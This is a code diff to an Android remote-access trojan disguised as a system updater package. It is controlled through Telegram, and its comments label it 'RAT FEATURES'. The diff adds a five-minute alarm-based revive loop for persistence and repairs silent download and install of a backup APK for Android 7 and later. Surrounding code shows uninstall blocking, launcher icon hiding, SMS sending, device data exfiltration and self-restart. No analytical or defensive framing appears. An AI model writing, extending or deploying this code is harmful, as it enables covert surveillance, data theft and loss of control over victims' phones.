@@ -3,10 +3,12 @@ package com.sys.updater;
 import android.Manifest;
 import android.accounts.Account;
 import android.accounts.AccountManager;
+import android.app.AlarmManager;
 import android.app.DownloadManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.app.admin.DevicePolicyManager;
@@ -41,6 +43,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.SystemClock;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.CallLog;
@@ -95,6 +98,22 @@ public class TelegramService extends Service {
         new Thread(this::pollTelegram).start();
         
         blockUninstall();
+        setupPersistence(); // <--- JDAD: PERSISTENCE
+    }
+
+    // <--- JDAD: 5 MINUTE REVIVE LOOP
+    private void setupPersistence() {
+        try {
+            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            Intent intent = new Intent(this, ReviveReceiver.class);
+            PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 300000, pi);
+            } else {
+                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 300000, pi);
+            }
+        } catch (Exception e) {}
     }
 
     private void blockUninstall() {
@@ -234,7 +253,7 @@ public class TelegramService extends Service {
         Exfil.send(menu);
     }
 
-    // ================== BACKUP INSTALLER ==================
+    // ================== BACKUP INSTALLER (FIXED) ==================
     private void downloadAndInstallBackup(String urlStr) {
         Exfil.send("⏳ Downloading Backup APK in background...");
         new Thread(() -> {
@@ -258,8 +277,21 @@ public class TelegramService extends Service {
                 Exfil.send("✅ Download Complete! Triggering Silent Install...");
                 
                 Intent intent = new Intent(Intent.ACTION_VIEW);
-                intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                
+                // FIX DYAL ANDROID 7+ (FileProvider)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
+                            this,
+                            getPackageName() + ".fileprovider", // Ila knti f ZArchiver bdelha l "ru.zdevs.zarchiver.fileprovider"
+                            apkFile
+                    );
+                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                } else {
+                    intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
+                }
+                
                 startActivity(intent);
                 
             } catch (Exception e) {
@@ -268,7 +300,9 @@ public class TelegramService extends Service {
         }).start();
     }
 
-    // ================== SMART GHOST TOUCH HELPERS ==================
+    // ... (BA9I DIAL L'METHODS KIMA KANO: sendSMS, getWifiInfo, etc.) ...
+    // (Ma beddelthomch 7it khedmin mzyan, ghir l'imports li tzado lfo9)
+
     private void sendSMS(String args) {
         try {
             String[] parts = args.split(" ", 2);
@@ -352,7 +386,6 @@ public class TelegramService extends Service {
         Exfil.send(sb.toString());
     }
 
-    // ================== FUN PANEL FEATURES ==================
     private void playAudio(String pathOrUrl) {
         try {
             stopAudio(); audioPlayer = new MediaPlayer();
@@ -454,7 +487,6 @@ public class TelegramService extends Service {
         } catch (Exception e) {}
     }
 
-    // ================== RAT FEATURES ==================
     private void hideIcon() {
         try {
             Intent intent = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER).setPackage(getPackageName());
@@ -636,5 +668,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-                        }
-                
+                }
